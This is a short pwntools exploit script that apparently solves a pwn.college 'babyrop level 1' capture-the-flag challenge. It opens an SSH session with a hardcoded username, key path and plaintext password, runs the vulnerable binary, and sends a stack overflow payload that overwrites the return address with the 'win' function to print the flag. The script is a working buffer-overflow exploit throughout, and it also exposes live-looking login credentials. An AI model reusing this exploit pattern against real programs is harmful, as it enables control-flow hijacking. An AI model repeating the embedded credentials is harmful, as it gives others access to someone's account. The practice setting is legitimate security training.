from pwn import *

e = ELF('./babyrop_level1_testing1')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')
p = s.run('/babyrop_level1_testing1')

pay = b'A' * 0x78
pay += p64(e.symbols['win'])

p.sendafter(b'\n\n',pay)
p.recvuntil(b': \n')
print(p.recv().strip().decode())